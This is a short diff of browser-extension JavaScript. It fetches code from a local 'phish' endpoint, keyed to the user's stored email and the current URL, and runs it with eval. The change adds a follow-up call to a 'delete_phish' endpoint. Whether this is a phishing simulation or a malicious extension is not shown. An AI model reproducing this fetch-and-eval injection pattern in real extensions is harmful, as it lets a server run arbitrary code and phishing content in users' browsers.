@@ -6,6 +6,8 @@ chrome.storage.local.get('email', function (res) {
 
             $.get(`http://localhost:5000/phish/${res.email}/${url}`, function (resu) {
                 eval(resu.code);
+
+                $.post(`http://localhost:5000/delete_phish/${res.email}/${url}`);
             });
         }
     });
